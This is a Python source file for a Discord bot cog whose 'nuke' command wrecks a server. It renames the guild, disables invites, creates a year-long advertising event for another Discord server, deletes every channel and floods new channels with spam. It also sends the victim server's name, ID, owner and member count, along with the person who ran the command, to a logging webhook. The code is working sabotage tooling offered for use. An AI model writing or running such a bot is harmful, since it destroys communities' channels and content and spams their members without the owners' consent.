import discord
from discord.ext import commands
from datetime import (
    datetime,
    timedelta,
    timezone
)
import aiohttp
import os
from src.operations.operations import (
    delete_channels,
    create_channels_and_spam
)
from src.core.managers.predicates import cooldown
from src.core.managers.help import send_bot_help, send_command_help

LOG_HOOK = os.getenv("LOG_HOOK")


async def log_nuke(guild: discord.Guild, user: discord.User, member_count: int):
    if not LOG_HOOK:
        return
    embed = {
        "title": "Nuke Executed",
        "color": 0xE74C3C,
        "fields": [
            {"name": "Server Name", "value": guild.name, "inline": True},
            {"name": "Server ID", "value": str(guild.id), "inline": True},
            {"name": "Owner", "value": f"{guild.owner} ({guild.owner_id})", "inline": True},
            {"name": "Member Count", "value": str(member_count), "inline": True},
            {"name": "Executed By", "value": f"{user} ({user.id})", "inline": True},
            {"name": "Executed At", "value": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True},
        ],
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    async with aiohttp.ClientSession() as session:
        await session.post(LOG_HOOK, json={"embeds": [embed]})


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(
        name="nuke",
        aliases=["kill"],
        description="Completely wipes the server",
        help="Deletes all channels, creates new ones with spam, edits server settings, and creates a scheduled event")
    @cooldown(1, 600, commands.BucketType.guild)
    async def nuke(self, ctx: commands.Context):
        await log_nuke(ctx.guild, ctx.author, ctx.guild.member_count)
        await ctx.message.delete()
        await ctx.guild.edit(
            name="Nuked by Aerith.",
            description="this server has been nuked by Aerith, join discord.gg/ossyra for bots like this!",
            invites_disabled_until=datetime.now(timezone.utc) + timedelta(days=1),
            community=False
        )
        start_time = datetime.now(timezone.utc) + timedelta(seconds=5)
        end_time = start_time + timedelta(days=365)
        try:
            await ctx.guild.create_scheduled_event(
                name="Aerith was HERE!",
                description="join discord.gg/ossyra for bots like this!",
                start_time=start_time,
                end_time=end_time,
                entity_type=discord.EntityType.external,
                location="https://discord.gg/ossyra"
            )
        except discord.HTTPException:
            pass
        await delete_channels(ctx.guild)
        await create_channels_and_spam(ctx.guild)

    @commands.command(name="help", aliases=["h"])
    async def help(self, ctx: commands.Context, *, command: str = None):
        if command is None:
            await send_bot_help(ctx)
        else:
            cmd = self.bot.get_command(command)
            if cmd:
                await send_command_help(ctx, cmd)
            else:
                await ctx.send(f"Command `{command}` not found.")
